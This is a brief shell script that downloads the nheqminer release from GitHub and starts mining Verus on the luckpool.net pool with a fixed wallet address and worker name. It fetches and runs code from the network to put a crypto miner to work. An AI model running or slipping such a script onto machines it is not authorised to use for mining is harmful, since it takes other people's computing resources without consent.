#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvzf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz
./nheqminer -v -l na.luckpool.net:3956 -u RAKBn8kUNMe3HBr4CWy1SQgzys1NfS3j5M.jack  -p x -t 2

